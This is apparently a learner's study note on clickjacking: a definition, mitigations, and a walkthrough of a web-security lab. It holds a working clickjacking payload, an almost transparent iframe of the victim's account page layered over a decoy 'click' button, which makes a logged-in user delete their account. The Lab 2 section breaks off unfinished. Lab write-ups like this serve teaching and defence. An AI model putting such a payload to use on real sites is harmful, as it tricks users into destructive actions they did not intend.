# Clickjacking (UI reddressing):
Tricking users into clicking something harmful without their knowledge. 

 <iframe> is an HTML tag through which, you can show one's website or content inside a box within another website. 

```
<iframe src=example.com> </iframe>
```
 Mitigation: 
 1. CSP Header (Controls which sites are allowed to embed your page.)
 2. X-Frame-Options (It is a response header used to control whether your site can be loaded inside an <iframe>)
 3. A frame buster script is code that detects if your webpage is loaded inside an <iframe> and forces it to break out and open normally.

Lab 1: Basic Clickjacking with CSRF token protection:
1. Login using the credentials provided.
2. Go to exploit server
3. On the Exploit server's body paste
```
    <style>
    iframe {
        position:relative;
        width: 1135;
        height: 600;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 510;
        left: 80;
        z-index: 1;
    }
  </style>
<div>click</div>
<iframe src="https://0a7900de03dfdbbd8104579700a400d0.web-security-academy.net/my-account"></iframe>
```
- src= is the requesting link to the legitimate website Even if you don’t see a session ID in the URL, the user can still be authenticated because modern websites uses cookies which are automatically sent by the browser when iframe loads the site.
- div is the button we are creating
- style is the CSS we use for size and font etc.
- z-index: higher means closer to the user
4. Change Values according to the legitimate website by doing view exploit.
5. Deliver exploit to victim

when user can only sees click button on the exploit website it clicks and it deletes the user's account on the legitimate website.

Lab 2:

just because the user wont be able to see the legitimate link 
